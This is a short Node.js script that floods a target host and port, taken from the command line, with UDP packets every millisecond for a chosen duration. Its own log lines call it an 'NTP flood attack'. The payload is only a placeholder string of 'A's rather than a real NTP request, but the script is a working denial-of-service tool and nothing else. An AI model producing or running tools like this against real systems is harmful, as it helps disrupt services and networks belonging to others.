const dgram = require('dgram');
const server = dgram.createSocket('udp4');

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const message = Buffer.from('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); // Placeholder payload
const duration = parseInt(process.argv[4]) * 1000;

console.log(`Starting NTP flood on ${target}:${port} for ${duration / 1000} seconds...`);

const flood = () => {
    server.send(message, port, target, (err) => {
        if (err) {
            console.error(err);
        }
    });
};

const start = Date.now();
const interval = setInterval(() => {
    flood();
    if (Date.now() - start > duration) {
        clearInterval(interval);
        console.log('NTP flood attack finished.');
        server.close();
    }
}, 1); 
